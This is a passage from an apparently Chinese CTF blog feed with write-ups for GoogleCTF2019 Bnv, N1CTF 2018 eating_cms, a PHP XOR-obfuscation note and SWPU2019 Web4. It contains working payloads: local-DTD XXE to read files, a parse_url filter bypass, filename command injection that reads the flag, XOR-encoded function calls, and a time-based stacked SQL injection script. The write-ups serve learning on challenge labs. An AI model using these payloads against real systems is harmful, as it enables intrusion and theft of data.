    <category term="flask" scheme="http://lll-nnn.github.io/categories/CTF/flask/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="flask" scheme="http://lll-nnn.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Bnv</title>
    <link href="http://lll-nnn.github.io/2021/08/01/BUU91/"/>
    <id>http://lll-nnn.github.io/2021/08/01/BUU91/</id>
    <published>2021-08-01T04:10:36.000Z</published>
    <updated>2021-08-01T04:44:32.664Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/08/5a5f87e50976a9cd.png"><br><code>submit</code>抓包   </p><pre><code>POST /api/search HTTP/1.1Host: c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-type: application/jsonContent-Length: 38Origin: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cnConnection: closeReferer: http://c430f277-c1c5-4e12-bb0b-b09fef668afa.node4.buuoj.cn/&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;       </code></pre><p><code>json</code><br>尝试sqli，不行<br>有json的地方可能存在<code>xxe</code><br><code>Content-type</code>改为<code>application/xml</code>   </p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (#PCDATA)&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;message&gt;&amp;xxe;&lt;/message&gt;</code></pre><p>返回<code>No result found</code>     </p><p>看来不行    </p><p>WP：</p><p><a href="https://www.dazhuanlan.com/xlllovelife/topics/1220539"><code>利用本地DTD文件进行XXE</code></a>       </p><p>payload:</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message[    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;    &lt;!ENTITY % ISOamso &#39;    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;    &amp;#x25;eval;    &amp;#x25;error;&#39;&gt;%local_dtd;]&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GoogleCTF2019-Quals-Bnv&quot;&gt;&lt;a href=&quot;#GoogleCTF2019-Quals-Bnv&quot; class=&quot;headerlink&quot; title=&quot;[GoogleCTF2019 Quals]Bnv&quot;&gt;&lt;/a&gt;[GoogleCTF2019 Q</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="xxe" scheme="http://lll-nnn.github.io/categories/CTF/xxe/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="xxe" scheme="http://lll-nnn.github.io/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>Eating_cms</title>
    <link href="http://lll-nnn.github.io/2021/08/01/BUU90/"/>
    <id>http://lll-nnn.github.io/2021/08/01/BUU90/</id>
    <published>2021-08-01T03:49:47.000Z</published>
    <updated>2021-08-01T04:27:07.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><h4 id="parse-url-解析漏洞"><a href="#parse-url-解析漏洞" class="headerlink" title="parse_url()解析漏洞"></a><code>parse_url()</code>解析漏洞</h4><ul><li><p><code>function.php</code>中</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">filter_directory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$keywords</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"manage"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ffffllllaaaaggg"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REQUEST_URI"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$uri</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($query);</span><span class="token comment">//    die();</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$keywords</span> <span class="token keyword">as</span> <span class="token variable">$token</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token function">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><p>这样就会被匹配到，不能读取；但是如果这样<code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code>parse_url就会返回<code>false</code>；读取成功。</p><p><img src="https://ftp.bmp.ovh/imgs/2021/08/777d762da5a7bc08.png"></p><p><strong>漏洞问题只存在于php5.4.7以前</strong></p><hr><p>真正的上传地址<code>http://675a4ec5-c964-4b92-a667-7415df780f0f.node4.buuoj.cn/user.php?page=m4aaannngggeee</code></p><pre class="language-php" data-language="php"><code class="language-php">//upllloadddd.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"gif"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"png"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//system命令执行，抓包改filename即可</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;img src='data:image/png;base64,"</span><span class="token punctuation">.</span><span class="token variable">$picdata</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>payload：</p><blockquote><p><code>;cd ..;ls;#</code></p><p><code>;cd ..;cat flag_233333;#</code></p><p><strong><strong>****</strong></strong>或者*<strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">||</span> `<span class="token keyword">echo</span> bHMgLw<span class="token operator">==</span> <span class="token operator">|</span>base64 <span class="token operator">-</span>d`ls <span class="token operator">/</span><span class="token operator">||</span> `<span class="token keyword">echo</span> Y2F0IC9mbGFnXzIzMzMzMyA<span class="token operator">=</span> <span class="token operator">|</span>base64 <span class="token operator">-</span>d` cat <span class="token operator">/</span>flag_233333</code></pre></blockquote></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;N1CTF-2018-eating-cms&quot;&gt;&lt;a href=&quot;#N1CTF-2018-eating-cms&quot; class=&quot;headerlink&quot; title=&quot;[N1CTF 2018]eating_cms&quot;&gt;&lt;/a&gt;[N1CTF 2018]eating_cms</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="rce" scheme="http://lll-nnn.github.io/categories/CTF/rce/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="rce" scheme="http://lll-nnn.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>异或^</title>
    <link href="http://lll-nnn.github.io/2021/07/14/%E5%BC%82%E6%88%96/"/>
    <id>http://lll-nnn.github.io/2021/07/14/%E5%BC%82%E6%88%96/</id>
    <published>2021-07-13T23:47:42.000Z</published>
    <updated>2021-08-01T04:44:17.726Z</updated>
    
    <content type="html"><![CDATA[<h1 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h1><p>异或就是二进制对应位上运算：   </p><pre><code>1^1=0  1^0=10^0=0   </code></pre><p>%ff对应的是十进制的255，二进制就是<code>111111111</code>,所以它与其他异或后再与原来的异或就等于原来的<br><img src="https://ftp.bmp.ovh/imgs/2021/07/a92fa8f2e18a60bf.png">       </p><pre><code><pre class="language-python" data-language="python"><code class="language-python">res<span class="token operator">=</span><span class="token string">'phpinfo'</span>     <span class="token comment">##要异或的</span>temp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>    temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> temp<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'^'</span><span class="token operator">+</span><span class="token string">'%ff'</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></code></pre><p><code>phpinfo</code>—-&gt;<code>%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</code>—-&gt;payload:<code>((%8f%97%8f%96%91%99%90)^(%ff%ff%ff%ff%ff%ff%ff))();</code>(每一部分都要括起来)     </p><h2 id="有字符长度限制的话"><a href="#有字符长度限制的话" class="headerlink" title="有字符长度限制的话"></a>有字符长度限制的话</h2><p>比如:    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></code></pre><p>这个是限定所用的字符种类小于或等于13       </p><p>看看有没有那个字符可以由其它的异或而来    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/abd98b027f2cf77f.png">      </p><pre><code><pre class="language-python" data-language="python"><code class="language-python">res<span class="token operator">=</span><span class="token string">'\'().;_acdinprst'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">for</span> m <span class="token keyword">in</span> res<span class="token punctuation">:</span>            <span class="token keyword">for</span> n <span class="token keyword">in</span> res<span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">==</span>m <span class="token keyword">or</span> j<span class="token operator">==</span>n <span class="token keyword">or</span> m<span class="token operator">==</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token string">'=='</span><span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">'^'</span><span class="token operator">+</span>m<span class="token operator">+</span><span class="token string">'^'</span><span class="token operator">+</span>n<span class="token punctuation">)</span></code></pre></code></pre><p>这里用三个来异或一个，两个的话太少，不行<br><img src="https://ftp.bmp.ovh/imgs/2021/07/cf8c1d80d192df60.png">        </p><p>随便选三个   </p><pre><code>c==d^n^id==c^i^ni==c^n^dc^%ff===d^n^i^%ff===d^%ff^n^%ff^i^%ff</code></pre><p><code>print_r</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)</code>—-&gt;加上两串<code>(%ff%ff%ff%ff%ff%ff%ff)</code>—&gt;<code>(%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>—–&gt;将对应位置上的字符修改，比如<code>i</code>在第三位，就把前三串的第三位改成<code>c n d</code>对应的<code>%9c %91 %9b</code>—-&gt;<code>(%8f%8d%9c%91%8b%a0%8d)^(%ff%ff%91%ff%ff%ff%ff)^(%ff%ff%9b%ff%ff%ff%ff)^(%ff%ff%ff%ff%ff%ff%ff)</code>    </p><p>scandir也换后     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/7f460d9d7f5b74e8.png">   </p><p>原本十五个，加上<code>%ff</code>，十六个，减三，十三个</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;异或&quot;&gt;&lt;a href=&quot;#异或&quot; class=&quot;headerlink&quot; title=&quot;异或&quot;&gt;&lt;/a&gt;异或&lt;/h1&gt;&lt;p&gt;异或就是二进制对应位上运算：   &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1^1=0  
1^0=1
0^0=0   &lt;/code&gt;&lt;/pre&gt;
&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="or^or" scheme="http://lll-nnn.github.io/categories/CTF/or-or/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="knowledge" scheme="http://lll-nnn.github.io/tags/knowledge/"/>
    
    <category term="or^or" scheme="http://lll-nnn.github.io/tags/or-or/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://lll-nnn.github.io/2021/07/11/BUU89/"/>
    <id>http://lll-nnn.github.io/2021/07/11/BUU89/</id>
    <published>2021-07-11T14:58:38.589Z</published>
    <updated>2021-07-14T01:07:07.341Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title:  [SWPU2019]Web4<br>date:  2021-07-11 22:58:38<br>tags:  [CTF,WP,sql]<br>categories:  [CTF,sql]<br>index_img:  /img/0016.png<br>banner_img:  /img/0015.jpg</p><hr><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>打开是一个登录框<br><img src="https://ftp.bmp.ovh/imgs/2021/07/29b0021639f71a2e.png">      </p><p>burp抓包加个<code>&#39;</code>发现报错<br><img src="https://ftp.bmp.ovh/imgs/2021/07/f58c9b6d66785aff.png">     </p><p>sql注入了，不过报错显示的是<code>fetch()</code>函数错误     </p><p><a href="https://xz.aliyun.com/t/3950"><code>PDO下的SQL注入</code></a><br>PDO—&gt;php数据对象       </p><p>PDO支持多语句执行，也就是堆叠注入      </p><p>PDO中的query()函数同数据库交互</p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dbms</span><span class="token operator">=</span><span class="token single-quoted-string string">'mysql'</span><span class="token punctuation">;</span><span class="token variable">$host</span><span class="token operator">=</span><span class="token single-quoted-string string">'192.168.27.61'</span><span class="token punctuation">;</span><span class="token variable">$dbName</span><span class="token operator">=</span><span class="token single-quoted-string string">'test'</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dsn</span><span class="token operator">=</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$dbms</span></span>:host=<span class="token interpolation"><span class="token variable">$host</span></span>;dbname=<span class="token interpolation"><span class="token variable">$dbName</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$dsn</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select * from user where id=1;"</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token double-quoted-string string">"create table test2 like user"</span><span class="token punctuation">;</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre></code></pre><p>prepare预处理      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/fb83bbb774d5c639.png">      </p><p>以此结合十六进制注入    </p><p>找了WP的脚本，但跑不出来-_-</p><pre><code><pre class="language-python" data-language="python"><code class="language-python">    <span class="token comment">#author: c1e4r</span>    <span class="token keyword">import</span> requests    <span class="token keyword">import</span> json    <span class="token keyword">import</span> time    <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#题目地址</span>        url <span class="token operator">=</span> <span class="token triple-quoted-string string">'''http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login'''</span>        <span class="token comment">#注入payload</span>        payloads <span class="token operator">=</span> <span class="token string">"asd';set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -"</span>        flag <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#查询payload</span>            payload <span class="token operator">=</span> <span class="token string">"select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)"</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment">#将构造好的payload进行16进制转码和json转码</span>                datas <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span>payloads<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str_to_hex<span class="token punctuation">(</span>payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'test213'</span><span class="token punctuation">&#125;</span>                data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>datas<span class="token punctuation">)</span>                times <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>                res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>                <span class="token keyword">if</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> times <span class="token operator">>=</span> <span class="token number">3</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>                    <span class="token keyword">break</span>    <span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span><span class="token punctuation">)</span>    ```  得到`glzjin_wants_a_girl_friend<span class="token punctuation">.</span><span class="token builtin">zip</span>`源码     !<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>ftp<span class="token punctuation">.</span>bmp<span class="token punctuation">.</span>ovh<span class="token operator">/</span>imgs<span class="token operator">/</span><span class="token number">2021</span><span class="token operator">/</span><span class="token number">07</span><span class="token operator">/</span>b7c5c05c1929a09f<span class="token punctuation">.</span>png<span class="token punctuation">)</span>     `前端应用逻辑的基础在 controller 文件夹下面，而其他文件都是基于 basecontroller<span class="token punctuation">.</span>php 所以我们打开 basecontroller<span class="token punctuation">.</span>php 文件进行代码审计`          ```php    private $viewPath<span class="token punctuation">;</span>        public function 